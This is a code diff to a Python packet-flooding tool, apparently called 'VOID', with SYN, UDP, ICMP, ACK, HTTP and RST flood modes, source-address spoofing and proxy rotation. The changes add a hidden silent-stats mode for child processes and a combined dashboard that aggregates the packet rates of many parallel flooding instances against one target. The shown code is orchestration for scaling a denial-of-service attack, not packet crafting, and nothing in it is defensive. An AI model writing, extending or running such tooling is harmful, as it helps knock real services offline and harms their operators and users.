@@ -845,7 +845,7 @@ def _bar(ratio: float, width: int = 28, col: str = "bright_red") -> Text:
 # RUN
 # ══════════════════════════════════════════════════════════════════
 
-def run(target: str, port_list: list, mode: dict, n_threads: int):
+def run(target: str, port_list: list, mode: dict, n_threads: int, stats_file: str = ""):
     # Lower process priority so other apps stay responsive
     try: os.nice(19)
     except Exception: pass
@@ -881,6 +881,35 @@ def run(target: str, port_list: list, mode: dict, n_threads: int):
             except Exception:
                 break
     threading.Thread(target=_watch, daemon=True).start()
+
+    # ── SILENT MODE: write stats to file (used by multi-instance parent) ──────
+    if stats_file:
+        import json as _json
+        def _stats_writer():
+            while not stop_event.is_set():
+                snap = stats.snapshot()
+                snap["pps"] = stats.pps()
+                try:
+                    with open(stats_file, "w") as _sf:
+                        _json.dump(snap, _sf)
+                except Exception:
+                    pass
+                time.sleep(0.4)
+        threading.Thread(target=_stats_writer, daemon=True).start()
+        try:
+            stop_event.wait()
+        except KeyboardInterrupt:
+            stop_event.set()
+        for t in senders:
+            t.join(timeout=0.5)
+        try:
+            with open(stats_file, "w") as _sf:
+                snap = stats.snapshot(); snap["pps"] = 0; snap["done"] = True
+                _json.dump(snap, _sf)
+        except Exception:
+            pass
+        return
+    # ── NORMAL MODE: full live display ────────────────────────────────────────
 
     _snap_log    : list = []
     _last_snap_t : list = [time.time()]
@@ -1106,6 +1135,8 @@ def main():
     parser.add_argument("--ports",   default="",
                         help="Comma-separated ports to cycle across per packet (e.g. 80,443,8080). "
                              "Leave blank to use the single port from --port or the prompt.")
+    parser.add_argument("--stats-file", default="", dest="stats_file",
+                        help=argparse.SUPPRESS)   # internal: silent mode, write JSON stats to path
     parser.add_argument("--child",  action="store_true",
                         help=argparse.SUPPRESS)   # internal: skips prompts in sub-instances
     args, _ = parser.parse_known_args()
@@ -1143,7 +1174,7 @@ def main():
         except Exception:
             pass
         try:
-            run(target, port_list, mode, n_threads)
+            run(target, port_list, mode, n_threads, stats_file=args.stats_file)
         except KeyboardInterrupt:
             stop_event.set()
         return
@@ -1265,35 +1296,120 @@ def main():
         if PROXY_MGR.count:
             child_cmd += ["--proxies", args.proxies]
 
-        log_files = []
-        procs     = []
+        stats_files = [f"/tmp/void_stats_{i}.json" for i in range(n_instances)]
+        # Pre-create empty stat files so the dashboard doesn't error before children write
+        import json as _json
+        for sf in stats_files:
+            try:
+                with open(sf, "w") as _f: _json.dump({"sent":0,"replies":0,"errors":0,"pps":0,"elapsed":0,"by_mode":{}}, _f)
+            except Exception: pass
+
+        procs = []
         for i in range(n_instances):
-            lf = open(f"/tmp/void_triple_{i}.log", "w")
-            log_files.append(lf)
-            procs.append(subprocess.Popen(child_cmd, stdout=lf, stderr=lf))
+            child_with_stats = child_cmd + ["--stats-file", stats_files[i]]
+            procs.append(subprocess.Popen(child_with_stats,
+                                          stdout=subprocess.DEVNULL,
+                                          stderr=subprocess.DEVNULL))
 
         pids_str = "  ".join(f"[yellow]{p.pid}[/]" for p in procs)
         console.print(f"  [bold bright_red][!!!][/]  {n_instances} instances live — PIDs: {pids_str}")
-        logs_str = "  ".join(f"/tmp/void_triple_{i}.log" for i in range(min(n_instances, 3)))
-        if n_instances > 3:
-            logs_str += f"  … (+{n_instances-3} more)"
-        console.print(f"  [dim]Logs: {logs_str}[/]")
         console.print(f"  [dim]Press Ctrl+C to stop all {n_instances}[/]")
         console.print()
 
+        t_start = time.time()
+        mode_colors = {"SYN":"bright_red","UDP":"bright_cyan","ICMP":"yellow",
+                       "ACK":"bright_magenta","HTTP":"bright_green","RST":"bright_yellow","SYNACK":"magenta"}
+        mcol = mode_colors.get(mode["key"], "bright_red")
+
+        def _read_stats(path):
+            try:
+                with open(path) as _f: return _json.load(_f)
+            except Exception: return {"sent":0,"replies":0,"errors":0,"pps":0,"elapsed":0,"by_mode":{}}
+
         try:
-            while True:
-                alive = sum(1 for p in procs if p.poll() is None)
-                console.print(f"\r  [bright_red]▶[/]  {alive}/{n_instances} instances running…", end="")
-                time.sleep(2)
+            from rich.console import Group
+            with Live(console=console, refresh_per_second=1, screen=False) as live:
+                while True:
+                    alive = sum(1 for p in procs if p.poll() is None)
+                    if alive == 0:
+                        stop_event.set(); break
+
+                    all_stats = [_read_stats(sf) for sf in stats_files]
+                    total_sent    = sum(d.get("sent",    0) for d in all_stats)
+                    total_replies = sum(d.get("replies", 0) for d in all_stats)
+                    total_errors  = sum(d.get("errors",  0) for d in all_stats)
+                    total_pps     = sum(d.get("pps",     0) for d in all_stats)
+                    elapsed       = time.time() - t_start
+
+                    # Combined by-mode totals
+                    combined_mode: dict = {}
+                    for d in all_stats:
+                        for mk, cnt in d.get("by_mode", {}).items():
+                            combined_mode[mk] = combined_mode.get(mk, 0) + cnt
+
+                    port_str_disp = ",".join(str(p) for p in port_list)
+                    src_info = ("[dim]src:[/] [bright_red]SPOOFED[/]" if USE_SPOOF
+                                else f"[dim]src:[/] [bright_white]{LOCAL_IP}[/]")
+
+                    tbl = Table.grid(padding=(0,2))
+                    tbl.add_column(); tbl.add_column()
+                    tbl.add_column(); tbl.add_column()
+                    tbl.add_row(Text("TARGET",  style="dim"), Text(f"{target}:{port_str_disp}", style="bold yellow"),
+                                Text("MODE",    style="dim"), Text(mode["label"], style=f"bold {mcol}"))
+                    tbl.add_row(Text("TOTAL",   style="dim"), Text(f"{total_sent:,}",    style="bold white"),
+                                Text("RATE",    style="dim"), Text(f"{total_pps:,.0f} pps", style="bold bright_red"))
+                    tbl.add_row(Text("REPLIES", style="dim"), Text(f"{total_replies:,}", style="bold bright_green"),
+                                Text("ERRORS",  style="dim"), Text(f"{total_errors:,}",  style="dim red"))
+                    tbl.add_row(Text("THREADS", style="dim"), Text(f"{threads_per_child*n_instances} ({threads_per_child}×{n_instances})", style="bold white"),
+                                Text("UP",      style="dim"), Text(f"{elapsed:.0f}s",   style="bold white"))
+
+                    rate_bar = Text()
+                    rate_bar.append("  RATE   ", style="bold white")
+                    rate_bar.append_text(_bar(min(total_pps/500_000, 1.0), width=26, col=mcol))
+                    rate_bar.append(f"  {total_pps:,.0f} pps", style=f"bold {mcol}")
+
+                    rep_bar = Text()
+                    rep_bar.append("  REPLY  ", style="bold white")
+                    rep_bar.append_text(_bar(min(total_replies/max(total_sent,1), 1.0), width=26, col="bright_green"))
+                    rep_bar.append(f"  {total_replies:,}", style="bold bright_green")
+
+                    # Per-instance row (compact — one line each)
+                    inst_rows = []
+                    max_pps_inst = max((d.get("pps",0) for d in all_stats), default=1) or 1
+                    for i, d in enumerate(all_stats):
+                        is_alive = procs[i].poll() is None
+                        ipps  = d.get("pps", 0)
+                        isent = d.get("sent", 0)
+                        row = Text()
+                        row.append(f"  #{i+1:02d}  ", style="dim")
+                        row.append_text(_bar(ipps/max_pps_inst, width=18, col=mcol))
+                        row.append(f"  {ipps:>9,.0f} pps", style=f"bold {mcol}")
+                        row.append(f"  {isent:>12,}", style="dim")
+                        row.append("  ●" if is_alive else "  ✗",
+                                   style="bright_green" if is_alive else "red")
+                        inst_rows.append(row)
+
+                    live.update(Panel(
+                        Group(tbl, Text(""), rate_bar, rep_bar, Text(""),
+                              Text("  INSTANCES", style="dim"),
+                              *inst_rows,
+                              Text(""),
+                              Text.from_markup(f"  {src_info}  ·  [dim]{alive}/{n_instances} alive[/]"),
+                              Text("  Ctrl+C to stop all", style="dim red")),
+                        title=f"[bold bright_red]  VOID × {n_instances}  —  COMBINED DASHBOARD  [/]",
+                        border_style="bright_red", box=box.DOUBLE_EDGE))
+
+                    time.sleep(1.0)
+
         except KeyboardInterrupt:
             pass
         finally:
             for p in procs:
                 try: p.terminate()
                 except Exception: pass
-            for lf in log_files:
-                try: lf.close()
+            # Cleanup stat files
+            for sf in stats_files:
+                try: os.remove(sf)
                 except Exception: pass
             console.print(f"\n\n  [yellow]All {n_instances} instances stopped.[/]\n")
     else:
